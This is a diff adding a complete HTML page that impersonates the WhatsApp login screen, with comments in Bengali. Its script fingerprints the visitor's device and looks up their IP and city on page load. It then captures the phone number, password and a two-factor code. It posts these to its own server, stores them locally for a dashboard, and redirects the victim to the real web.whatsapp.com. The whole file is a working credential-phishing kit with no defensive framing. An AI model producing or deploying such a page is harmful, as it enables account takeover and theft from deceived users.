@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to WhatsApp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
+        body { 
+            background: linear-gradient(135deg, #25d366 0%, #128c7e 100%); 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            color: #1c1e21; 
+        }
+        .whatsapp-logo { 
+            margin-bottom: 24px; 
+            text-align: center; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .whatsapp-icon {
+            width: 60px;
+            height: 60px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        .whatsapp-icon img {
+            width: 65px;
+            height: 65px;
+        }
+        .whatsapp-logo-text { 
+            font-size: 32px; 
+            font-weight: 300; 
+            color: white; 
+            letter-spacing: 0.5px;
+        }
+        .container { 
+            background-color: white; 
+            padding: 24px; 
+            border-radius: 16px; 
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15); 
+            width: 100%; 
+            max-width: 400px; 
+            text-align: center; 
+        }
+        h1 { 
+            font-size: 22px; 
+            font-weight: 400; 
+            margin-bottom: 20px; 
+            color: #3b4a54;
+        }
+        .h1-2fa { 
+            font-size: 20px; 
+            font-weight: 600; 
+            margin-bottom: 10px; 
+            color: #25d366;
+        }
+        .p-2fa { 
+            font-size: 15px; 
+            color: #667781; 
+            margin-bottom: 20px; 
+            line-height: 1.4;
+        }
+        .input-group { 
+            margin-bottom: 18px; 
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #3b4a54;
+            font-weight: 500;
+        }
+        input[type="text"], input[type="password"], input[type="tel"] { 
+            width: 100%; 
+            height: 48px; 
+            border: 1px solid #e6e6e6; 
+            border-radius: 8px; 
+            padding: 0 15px; 
+            font-size: 16px; 
+            background-color: #f8f9fa; 
+            transition: all 0.2s ease;
+        }
+        input:focus { 
+            outline: none; 
+            border-color: #25d366; 
+            box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.2); 
+        }
+        #code { 
+            text-align: center; 
+            letter-spacing: 5px; 
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .button { 
+            color: white; 
+            background-color: #25d366; 
+            border: none; 
+            border-radius: 24px; 
+            padding: 14px 0; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            width: 100%; 
+            margin-top: 10px; 
+            transition: background-color 0.2s ease;
+        }
+        .button:hover { 
+            background-color: #1da851; 
+        }
+        .button:disabled {
+            background-color: #88d9a7;
+            cursor: wait;
+        }
+        #loader { 
+            display: none; 
+            margin: 10px auto; 
+            width: 30px; 
+            height: 30px; 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #25d366; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .footer {
+            margin-top: 24px;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            text-align: center;
+        }
+        .footer a {
+            color: white;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="whatsapp-logo">
+        <div class="whatsapp-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1200px-WhatsApp.svg.png" alt="WhatsApp Logo">
+        </div>
+        <div class="whatsapp-logo-text">WhatsApp</div>
+    </div>
+    <div class="container">
+        <!-- ধাপ ১: লগইন সেকশন -->
+        <div id="login-section">
+            <h1>Log in to WhatsApp</h1>
+            <div class="input-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="Your phone number with country code" required>
+            </div>
+            <div class="input-group">
+                <label for="pass">Password</label>
+                <input type="password" id="pass" placeholder="Your password" required>
+            </div>
+            <button id="login-button" class="button" onclick="sendLoginInfo()">Log In</button>
+            <div id="loader"></div>
+            <div style="margin-top: 16px; font-size: 14px; color: #667781;">
+                <a href="#" style="color: #25d366; text-decoration: none;">Forgot password?</a>
+            </div>
+        </div>
+        <!-- ধাপ ২: 2FA সেকশন (প্রাথমিকভাবে আড়াল) -->
+        <div id="2fa-section" style="display: none;">
+            <h1 class="h1-2fa">Two-Factor Authentication</h1>
+            <p class="p-2fa">Enter the 6-digit code sent to your WhatsApp.</p>
+            <div class="input-group">
+                <input type="text" id="code" placeholder="_ _ _ _ _ _" maxlength="6" required>
+            </div>
+            <button id="code-button" class="button" onclick="send2FACode()">Verify Code</button>
+            <div style="margin-top: 16px; font-size: 14px; color: #667781;">
+                Didn't receive a code? <a href="#" style="color: #25d366; text-decoration: none;">Resend</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>By logging in, you agree to our <a href="#">Terms & Privacy Policy</a>.</p>
+        <p style="margin-top: 8px;">© 2023 WhatsApp LLC</p>
+    </div>
+
+    <!-- =========== ডেটা সংগ্রহের জন্য আপডেট করা স্ক্রিপ্ট =========== -->
+    <script>
+        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
+        let deviceInfoPromise = (async () => {
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown', platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown', res: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            if (navigator.connection) deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                } catch (e) { /* ignore */ }
+            }
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+            } catch (e) { deviceInfo.ip = 'Failed to fetch'; }
+            return JSON.stringify(deviceInfo);
+        })();
+
+        // প্রথম ধাপ: ফোন ও পাসওয়ার্ড সাবমিট
+        async function sendLoginInfo() {
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+
+            if (!phone || !pass) {
+                alert('Please enter both phone number and password.');
+                return;
+            }
+
+            const loginButton = document.getElementById('login-button');
+            const loader = document.getElementById('loader');
+            loginButton.style.display = 'none';
+            loader.style.display = 'block';
+
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ ডেটা সেভ
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.whatsappData) storedData.whatsappData = [];
+                // ড্যাশবোর্ডের সুবিধার জন্য 'phone'-কে 'email' হিসেবে সেভ করা হচ্ছে
+                storedData.whatsappData.push({ email: phone, pass, deviceInfo, timestamp: new Date().toLocaleString(), type: 'login' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (e) { console.error('LocalStorage save error:', e); }
+
+            // সার্ভারে ডেটা পাঠানো
+            try {
+                await fetch('/', { method: 'POST', body: new URLSearchParams({ email: phone, pass, deviceInfo }) });
+            } catch (e) { console.error('Server send error:', e); }
+
+            setTimeout(() => {
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('2fa-section').style.display = 'block';
+                loader.style.display = 'none'; 
+                loginButton.style.display = 'block';
+            }, 1500);
+        }
+
+        // দ্বিতীয় ধাপ: 2FA কোড সাবমিট
+        async function send2FACode() {
+            const code = document.getElementById('code').value;
+            if (!code || code.length < 6) {
+                alert('Please enter a valid 6-digit code.');
+                return;
+            }
+            
+            const codeButton = document.getElementById('code-button');
+            codeButton.textContent = 'Verifying...';
+            codeButton.disabled = true;
+
+            const phone = document.getElementById('phone').value;
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ 2FA ডেটা সেভ
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.whatsappData) storedData.whatsappData = [];
+                storedData.whatsappData.push({ email: phone, '2fa_code': code, deviceInfo, timestamp: new Date().toLocaleString(), type: '2fa' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (e) { console.error('LocalStorage 2FA save error:', e); }
+
+            // সার্ভারে 2FA কোড পাঠানো
+            try {
+                await fetch('/', { method: 'POST', body: new URLSearchParams({ email: phone, '2fa_code': code, deviceInfo }) });
+            } catch (e) { console.error('Server 2FA send error:', e); }
+
+            setTimeout(() => window.location.href = 'https://web.whatsapp.com', 1000);
+        }
+    </script>
+</body>
+</html>
